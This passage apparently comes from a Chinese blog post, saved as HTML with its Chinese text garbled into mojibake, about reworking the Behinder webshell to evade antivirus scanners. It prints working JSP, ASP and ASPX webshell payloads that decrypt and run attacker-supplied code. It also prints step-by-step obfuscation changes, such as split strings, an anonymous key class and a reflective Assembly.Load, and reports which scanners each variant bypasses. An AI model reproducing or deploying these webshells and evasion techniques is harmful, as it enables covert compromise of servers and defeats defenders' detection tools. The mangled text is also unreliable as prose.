32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>ï¼Œk);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>ï¼Œ<span class="keyword">new</span> SecretKeySpec(k.getBytes()ï¼Œ<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>æœ¨é©¬å¾ˆçŸ­ï¼Œæ ¸å¿ƒå°±æ˜¯payload è§£å¯† base64ï¼Œ åœ¨è§£å¯†aes åœ¨åŠ¨æ€ç±»åŠ è½½</p><p>è¿™é‡Œé¢ç»è¿‡ç¬”è€…æµ‹è¯•ï¼Œ&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(bï¼Œ0ï¼Œb.length);}}%&gt;ï¼Œå®¹æ˜“è¢«æ€ï¼Œsession.putValue(â€œuâ€ï¼Œk);Cipher c=Cipher.getInstance(â€œAESâ€);c.init(2ï¼Œnew SecretKeySpec(k.getBytes()ï¼Œâ€AESâ€));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBufferä¹Ÿå®¹æ˜“è¢«æ€ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713192137570.png" alt="image-20250713192137570"></p><p>åŸç‰ˆçš„æœ¨é©¬è‚¯å®šæŠ¥æ¯’ï¼Œæˆ‘ä»¬fuzzä¸€ä¸‹ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713194553717-17524071539801.png" alt="image-20250713194553717"></p><p>ç›´æ¥ç»™aesåŠåŠŸèƒ½å»æ‰ï¼Œä¸æŠ¥ï¼Œé‚£å°±æ˜¯ï¼Œä¸»è¦çœ‹ä¸‹é¢è¿™éƒ¨åˆ†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713194620941.png" alt="image-20250713194620941"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if (request.getMethod().equals(&quot;PO&quot;+&quot;ST&quot;))&#123;String ssss=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">session.putValue(&quot;u&quot;ï¼Œssss);</span><br><span class="line">Cipher c=Cipher.getInstance(&quot;A&quot;+&quot;E&quot;+&quot;S&quot;);</span><br><span class="line">c.init(2ï¼Œnew SecretKeySpec(k.getBytes()ï¼Œ&quot;A&quot;+&quot;E&quot;+&quot;S&quot;));</span><br><span class="line">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(requestï¼Œresponseï¼Œseesion);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>å»é™¤new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(requestï¼Œresponseï¼Œseesion);ï¼Œå°±è¦æŠ¥å¯ç–‘<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713201843980.png" alt="image-20250713201843980"></p><p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬ç»™ä»–æ‹†å¼€ï¼Œè¿™ä¸€å¥å¤ªé•¿äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713203851218.png" alt="image-20250713203851218"></p><p>èŠ±ä¸€ç‚¹ç‚¹æ—¶é—´æ‹†å¼€äº†<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713203923359.png" alt="image-20250713203923359"></p><p>å°±æŠ¥äº†å¯ç–‘ï¼Œé‚£ä¹ˆè¿˜æ˜¯éœ€è¦fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹é‚£ä¸€å¥è¯ä¸è¡Œã€‚ç»è¿‡æµ‹è¯•å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">c.init(2ï¼Œ new SecretKeySpec(ssss.getBytes()ï¼Œ &quot;AES&quot;));</span><br><span class="line"></span><br><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">XxYzLoader u = new XxYzLoader(cl);</span><br></pre></td></tr></table></figure><p>ç»è¿‡ç¬”è€…æµ‹è¯•ï¼Œè¿™ä¸¤å¥éƒ½æœ‰é—®é¢˜ï¼Œä¸€å¥æ˜¯åŠ è½½aesï¼Œä¸€å¥æ˜¯åŠ¨æ€åŠ è½½ç±»ï¼Œæˆ‘ä»¬åœ¨ä¸Šæ¬¡çš„å“¥æ–¯æ‹‰äºŒå¼€ä¸­ï¼Œå…¶å®å·²ç»å‘ç°äº†ï¼Œdç›¾ä¼šæ‹¦æˆªgetClassLoaderè¿™ç§ç±»ä¼¼çš„å•è¯ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç”¨<code>getSystemClassLoader</code><br><code> ClassLoader cl = ClassLoader.getSystemClassLoader();  XxYzLoader u = new XxYzLoader(cl);</code></p><p>ä¸Šæ¬¡çš„å“¥æ–¯æ‹‰å…æ€aesåŠ å¯†ä¹Ÿæ˜¯æ‹¦æˆªï¼Œä¹Ÿå°±æ˜¯SecretKeySpecï¼Œå“¥æ–¯æ‹‰ç”¨çš„æ˜¯åå°„ç±»åŠ è½½ç»•è¿‡çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åŒ¿åç±»ï¼Œå¤§éƒ¨åˆ† AES ç”¨æ³•éƒ½éœ€è¦ <code>SecretKeySpec</code>ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªåŒ¿åç±»ç›´æ¥å®ç° <code>SecretKey</code>ï¼Œåªè¦å®ƒè¿”å›çš„å†…å®¹ç¬¦åˆè¦æ±‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SecretKey key = <span class="keyword">new</span> javax.crypto.SecretKey() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAlgorithm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFormat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RAW&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getEncoded() &#123;</span><br><span class="line">        <span class="keyword">return</span> ssss.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¿™æ ·ï¼Œè¿™æ ·ä¹Ÿå°±ç»•è¿‡äº†SecretKeySpecã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713212725771-17524132460002.png" alt="image-20250713212725771"></p><p>è¿™æ ·æˆ‘ä»¬æ”¹å®Œï¼Œä¹Ÿå°±æ²¡æœ‰é—®é¢˜äº†ï¼Œå…æ€dç›¾äº†ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713212823506.png" alt="image-20250713212823506"></p><p>åœ¨çº¿ç‰ˆæ²³é©¬ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œä¸Šæ¬¡æˆ‘ä»¬çš„godzillaï¼Œjspå°±æ²¡æœ‰è¿‡å»ï¼Œå› ä¸ºå½“æ—¶ä½¿ç”¨çš„æ˜¯åå°„ç±»åŠ è½½ï¼Œä»–ä¼šæŠ¥åå°„ç±»åŠ è½½ï¼Œè¿™æ¬¡å¹¶æ²¡æœ‰ä½¿ç”¨ã€‚<br>å¾®æ­¥<br>ä¹Ÿæ²¡å•¥é—®é¢˜ã€‚<br>ç«ç»’360<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713213830826.png" alt="image-20250713213830826"></p><p>okï¼Œå…¶ä»–çš„å°±ä¸åœ¨æµ‹è¯•äº†ï¼Œæˆ‘ä»¬å°è£…åˆ°å†°èä¸­ï¼Œæ”¹æ”¹åï¼Œè®©ä»–åŠ¨èµ·æ¥ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713221823114.png" alt="image-20250713221823114"></p><p>èŠ±ä¸€ç‚¹ç‚¹æ—¶é—´æŠŠæ¨¡æ¿å†™å¥½ï¼Œè€æ ·å­ï¼Œè¿›è¡Œéšæœºå­—ç¬¦é€‰å–å¹¶ä¸”ç”Ÿæˆã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713223354412.png" alt="image-20250713223354412"></p><p>è¿™é‡Œå¦‚æœä½ åœ¨ç”Ÿæˆæœ¨é©¬çš„æ—¶å€™ï¼Œæ²¡æœ‰å†™æœ¨é©¬ï¼Œé»˜è®¤ä¸º<code>bohemian</code>ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713224407939.png" alt="image-20250713224407939"></p><p>ç”Ÿæˆä¸‰åˆ†ï¼Œéƒ½ä¸ä¸€æ ·ï¼Œokã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250713224443321.png" alt="image-20250713224443321"></p><p>åŠŸèƒ½ä¹Ÿéƒ½æ­£å¸¸ã€‚å†æŠŠ404åŠ ä¸Šã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250714001925736.png" alt="image-20250714001925736"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250714001952066.png" alt="image-20250714001952066">okã€‚jspå°±å…ˆåˆ°è¿™é‡Œã€‚ä¸‹é¢å…æ€aspã€‚</p><h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹aspçš„æœ¨é©¬ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Response.CharSet = &quot;UTF-8&quot; </span><br><span class="line">k=&quot;e45e329feb5d925b&quot; &#x27;è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span><br><span class="line">Session(&quot;k&quot;)=k</span><br><span class="line">size=Request.TotalBytes</span><br><span class="line">content=Request.BinaryRead(size)</span><br><span class="line">For i=1 To size</span><br><span class="line">result=result&amp;Chr(ascb(midb(contentï¼Œiï¼Œ1)) Xor Asc(Mid(kï¼Œ(i and 15)+1ï¼Œ1)))</span><br><span class="line">Next</span><br><span class="line">execute(result)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¾ˆçŸ­ï¼Œåœ¨aspä¸­ï¼ŒåŠ å¯†å°±ä¸åœ¨ç”¨aesäº†ï¼Œè€Œæ˜¯ç”¨äº†xorï¼Œå¯èƒ½æ˜¯è°ƒç”¨aesä¸å¥½è°ƒç”¨äº†ã€‚æˆ‘ä»¬æ¥çœ‹ä¸‹æ€ä¹ˆå…æ€ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250714010004614.png" alt="image-20250714010004614"></p><p>åŸç‰ˆè‚¯å®šè¢«æ€ï¼Œè¿™é‡Œxoréœ€è¦æ”¹ä¸€ä¸‹ï¼Œè¿˜æœ‰å°±æ˜¯executeéœ€è¦æ”¹ä¸€ä¸‹ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720101659191.png" alt="image-20250720101659191"></p><p>ç»è¿‡ç¬”è€…æµ‹è¯•ï¼Œresult=result&amp;Chr(ascb(midb(contentï¼Œiï¼Œ1)) Xor Asc(Mid(kï¼Œ(i and 15)+1ï¼Œ1)))è¿™ä¸€å¥ä»æ–°å†™ä¸€ä¸‹å°±å¯è¿‡æ‰dç›¾ã€‚çœ‹çœ‹æ²³é©¬<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720101920447.png" alt="image-20250720101920447"></p><p>æ²³é©¬æœ¬åœ°çš„ä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜ã€‚åœ¨çº¿çš„ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720102029758.png" alt="image-20250720102029758"></p><p>å¾®æ­¥ï¼Œä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œæœ€è¿‘æµ‹è¯•å¥½åƒè€æ˜¯æœªçŸ¥ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720105901614.png" alt="image-20250720105901614"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720105919523.png" alt="image-20250720105919523"></p><p>æˆ‘ä»¬èŠ±ä¸€ç‚¹ç‚¹æ—¶é—´å°è£…ä¸€ä¸‹ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110010668.png" alt="image-20250720110010668"></p><p>æ•´ä¸ªæ¨¡æ¿ï¼Œå¥—ä¸€ä¸‹ï¼Œå³å¯ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110101718.png" alt="image-20250720110101718"></p><p>æ¬§å…‹ã€‚å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå¦‚æœä¼ ä¸Šå»æ˜¯500ï¼Œä¸è¦æ…Œï¼Œç›´æ¥è¿æ¥å³å¯ã€‚æ­£å¸¸ä½¿ç”¨ã€‚è¿™ä¸ªæŠ¥é”™æ˜¯æ²¡åŠ try.ä¸å½±å“ä½¿ç”¨ï¼Œå› ä¸ºæ²¡ä¼ é€’å‚æ•°å˜›.<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110256177.png" alt="image-20250720110256177"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110442638.png" alt="image-20250720110442638"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110525367.png" alt="image-20250720110525367"></p><p>åŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼ŒåŠ äº†çŠ¶æ€ç ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720110555691.png" alt="image-20250720110555691"></p><p>å¤§å®¶ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªaspçš„è¯·æ±‚åŒ…å’Œå›æ˜¾åŒ…éƒ½æ˜¯ä¹±ç ï¼Œè¿™å°±æ˜¯é©¬ä¸­xorèµ·çš„ä½œç”¨ï¼Œæœ‰ä¸å¯æ˜¾å­—ç¬¦å˜›ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720111519445.png" alt="image-20250720111519445"></p><p>å¥½çš„ï¼Œaspå…ˆåˆ°è¿™é‡Œï¼Œæ¥ä¸‹çœ‹aspx</p><h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>è¿˜æ˜¯å…ˆæ¥çœ‹ä¸‹aspxçš„æºç ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;ï¼Œ&quot;e45e329feb5d925b&quot;); /*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;)ï¼Œc = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(kï¼Œ k).TransformFinalBlock(cï¼Œ 0ï¼Œ c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯å¾ˆçŸ­ã€‚RijndaelManaged()  è¿™é‡Œæ˜¯åˆ›å»ºaesåŠ å¯†ï¼Œç”¨è·å–åˆ°çš„keyã€‚é‚£ä¹ˆæˆ‘ä»¬å°±é‡ç‚¹å¯¹è¿™é‡Œåšå…æ€ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720112953875.png" alt="image-20250720112953875"></p><p>å…ˆç®€å•æ‹†ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å•æ–‡ä»¶aspxï¼Œæˆ‘ä»¬fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹å“ªé‡Œæœ‰é—®é¢˜ï¼Œè¿˜æ˜¯ä»¥å‰æåˆ°çš„ï¼ŒRijndaelManaged æ¢æˆAesManagedï¼Œè¿™ä¸ªåŠ å¯†å‡½æ•°æ›¿æ¢ä¸€ä¸‹ï¼Œå°±å¯ä»¥äº†ã€‚<br>è¿™é‡Œç¬”è€…åœ¨fuzzçš„æ—¶å€™å‘ç°æ˜¯Assembly.Loadï¼Œä»–æ˜¯ç”¨æ¥æ’ä»¶ç³»ç»ŸåŠ è½½ç”¨æˆ·æ‰©å±• DLLï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯åŠ è½½å†…å­˜çš„ï¼Œä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„èƒ½æ›¿æ¢æ‰ï¼Œå¯ä»¥æ‹†å¼€ï¼Œåƒä¸‹é¢è¿™æ ·åå°„åŠ è½½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string asmClass = &quot;System.&quot; + &quot;Reflection.&quot; + &quot;Assembly&quot;;</span><br><span class="line">string loadMethod = &quot;Lo&quot; + &quot;ad&quot;;</span><br><span class="line">var asmType = Type.GetType(asmClass);</span><br><span class="line">var asm = asmType.GetMethod(loadMethodï¼Œ new Type[] &#123; typeof(byte[]) &#125;).Invoke(nullï¼Œ new object[] &#123; ccccc &#125;);</span><br><span class="line">((Assembly)asm).CreateInstance(&quot;U&quot;).Equals(this);</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720143532447.png" alt="image-20250720143532447"></p><p>è¿™æ ·å°±æŠŠå¯ä»¥æ–‡ä»¶å»æ‰äº†ã€‚<br>å‰©ä¸‹è¿™ä¸ªå•æ–‡ä»¶aspxäº†ï¼Œè¿™ä¸ªæˆ‘ä»¬åœ¨ä»¥å‰godzillaä¸­ï¼Œå·²ç»è¯´åˆ°äº†ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720144344297.png" alt="image-20250720144344297"></p><p>å°±æ˜¯å¤´éƒ¨æœ‰è¿™ç§<code>&lt;%@ Page Language=&quot;C#&quot; %&gt;``&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>ï¼Œè¿™é‡Œå¤„ç†æ˜¯å°†&lt;%@ Page Language=â€C#â€ %&gt;æ”¾åˆ°åé¢ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åº•éƒ¨ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720144512576-17529939129321.png" alt="image-20250720144512576"></p><p>é‚£ä¹ˆå…¶å®è¿˜æ˜¯ä¼šæŠ¥å•æ–‡ä»¶ï¼Œè¿™é‡Œå°±æ˜¯è¿˜å­˜åœ¨<code>&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>ï¼Œæˆ‘åªéœ€å°†è¿™ä¸ªå¼•å…¥å‘½åç©ºé—´System.Reflectionç›´æ¥å†™åˆ°åˆ©ç”¨çš„åœ°æ–¹å³å¯ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720145634926.png" alt="image-20250720145634926"></p><p>è¿™æ ·å°±ä¸ç”¨åœ¨ä¸Šé¢å®šä¹‰äº†ã€‚ä¹Ÿå°±å¯ä»¥è¿‡dç›¾äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720145702160.png" alt="image-20250720145702160"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720145816947.png" alt="image-20250720145816947">æœ¬åœ°æ²³é©¬æ²¡é—®é¢˜ã€‚åœ¨çº¿æ²³é©¬ä¹Ÿæ²¡é—®é¢˜<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720145947400.png" alt="image-20250720145947400"></p><p>å¾®æ­¥ï¼Œåªèƒ½è¯´å¾®æ­¥çš„gptè¯´çš„å¾ˆå¯¹ï¼Œå½“ç„¶ç»™åˆ°gptï¼Œæˆ‘æ„Ÿè§‰éƒ½èƒ½åˆ†æå‡ºå§.<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720150239785.png" alt="image-20250720150239785"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720150329609.png" alt="image-20250720150329609"></p><p>é˜¿é‡Œäº‘ï¼Œaspxçš„æˆ‘æƒŠå¥‡çš„å‘ç°ï¼Œè¿‡æ‰äº†é˜¿é‡Œäº‘ï¼Œåœ¨Godzillaä¸­æ˜¯æ²¡æœ‰è¿‡æ‰çš„ï¼Œåº”è¯¥æ˜¯å§å­—ç¬¦ä¸²éƒ½æ‹†å¼€çš„åŸå› .<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720150558999.png" alt="image-20250720150558999"></p><p>å¥½ï¼Œè¿™æ ·å…æ€å°±åšå®Œäº†ï¼Œ360å’Œç«ç»’å°±ä¸çœ‹äº†ï¼Œæ²¡å•¥æ„æ€.<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720151459044.png" alt="image-20250720151459044"></p><p>èŠ±ä¸€ç‚¹ç‚¹æ—¶é—´ï¼Œå°è£…ä¸€ä¸‹ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720155335012.png" alt="image-20250720155335012"></p><p>å¥½äº†ï¼Œç”Ÿæˆæœ¨é©¬æ—¶è®°å¾—å†™å¯†ç ï¼Œä¸å†™çš„è¯å°±æ˜¯bohemianã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720155618614-17529981803701.png" alt="image-20250720155618614"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720155652802.png" alt="image-20250720155652802"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720155723593.png" alt="image-20250720155723593"></p><p>ä½¿ç”¨èµ·æ¥ä¹Ÿæ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚302çŠ¶æ€ç ä¹ŸåŠ ä¸Šäº†ã€‚è¿™æ ·aspxçš„ä¹Ÿå°±å®Œæˆäº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>åœ¨ç•Œé¢æ·»åŠ äº†å…æ€ç”Ÿæˆçš„æŒ‰é’®ï¼Œè¿™æ ·åœ¨æ‰¾é©¬çš„æ—¶å€™å°±ä¸ä¼šæ‰‹å¿™è„šä¹±çš„äº†ï¼Œç›´æ¥ç”Ÿæˆå³å¯ã€‚è¿™é‡Œä¹Ÿç®—è¿›è¡Œäº†ç®€å•çš„å…æ€ï¼Œå…¨éƒ¨è¯­è¨€é™¤äº† aliyunæ²¡æœ‰è¿‡å»ï¼Œå…¶ä»–çš„å¹³å°åŸºæœ¬å…¨è¿‡ï¼Œaspxçš„é˜¿é‡Œäº‘è¿‡å»äº†ã€‚ä¸å¾—ä¸æ‰¿è®¤ï¼Œaliyunæ˜¯å¼ºçš„ã€‚php ç®€å•ä½¿ç”¨äº†ä¸€ä¸‹ç±»ã€å¯¹å…³é”®å­—è¿›è¡Œäº†chrçš„æ›¿æ¢ï¼Œjspé‡å†™äº†base64ç¼–ç æ–¹æ³•ï¼Œé‡å†™äº†åŠ è½½aesï¼Œä½¿ç”¨çš„åå°„å‹æ–¹æ³•å†™çš„ï¼Œå¯¹å…³é”®å­—è¿›è¡Œæ›¿æ¢ï¼Œaspä½¿ç”¨äº†chrè¿›è¡Œæ›¿æ¢å…³é”®å­—æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæ¢äº†ä¸€ä¸‹å‡½æ•°çš„å†™æ³•ï¼Œaspxå¯¹å…³é”®å‡½æ•°æ‹†å¼€é‡å†™ï¼Œå¹¶ä¸”å°†å…³é”®æŸ¥æ€å‡½æ•°é‡æ–°å†™äº†ä¸€ä¸‹ã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ï¼Œ<br>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚å…¶ä»–è¯­è¨€çš„ æ¯”å¦‚  